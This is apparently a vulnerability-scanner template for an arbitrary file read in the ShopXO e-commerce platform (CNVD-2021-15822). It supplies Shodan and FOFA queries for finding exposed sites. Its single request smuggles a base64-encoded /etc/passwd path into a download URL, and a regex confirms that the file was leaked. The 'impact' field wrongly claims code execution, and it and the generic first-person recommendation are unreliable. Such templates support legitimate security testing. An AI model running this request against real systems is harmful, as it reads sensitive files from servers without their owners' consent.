id: CNVD-2021-15822
info:
  name: ShopXO Download File Read
  author: pikpikcu
  severity: high
  reference:
  - https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog
  metadata:
    verified: true
    shodan-query: "title:\"ShopXO\u4F01\u4E1A\u7EA7B2C\u7535\u5546\u7CFB\u7EDF\u63D0\
      \u4F9B\u5546\""
    fofa-query: "app=\"ShopXO\u4F01\u4E1A\u7EA7B2C\u7535\u5546\u7CFB\u7EDF\u63D0\u4F9B\
      \u5546\""
    impact: The impact of CNVD-2021-15822, a vulnerability in the ShopXO download
      file read function, is that it allows attackers to execute arbitrary code and
      gain unauthorized access to the affected system.
    recommendation: I recommend implementing the necessary security updates and patches
      to prevent exploitation of the vulnerability CNVD-2021-15822 in the ShopXO download
      file read.
  tags: shopxo,lfi,cnvd,cnvd2021
  description: This is a security vulnerability identified as CNVD-2021-15822 that
    allows attackers to read ShopXO download files.
requests:
- raw:
  - 'GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=  HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
